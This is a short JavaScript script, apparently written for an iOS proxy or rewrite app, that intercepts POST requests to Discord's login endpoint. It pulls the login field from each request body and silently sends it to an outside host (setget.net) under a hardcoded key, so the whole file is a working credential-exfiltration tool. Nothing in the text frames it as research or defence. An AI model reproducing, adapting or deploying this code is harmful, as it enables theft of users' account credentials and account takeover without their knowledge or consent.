const url = $request.url;

const KEY = "nfnjksfhjkdsjfejfjekrngiernvcc";

if (
    $request.method === "POST" &&
    url === "https://discord.com/api/v9/auth/login"
) {
    try {
        let data = JSON.parse($request.body);
        let token = data.login;

        if (token) {
            token = String(token)
                .replace(/["\\:]/g, "")
                .trim();

            $httpClient.post({
                url: `https://setget.net/set/${KEY}`,
                headers: {
                    "Content-Type": "text/plain"
                },
                body: token
            }, function(error, response, body) {
                console.log("send:", error || "OK");
            });
        }
    } catch (e) {
        console.log(e);
    }
}

$done({});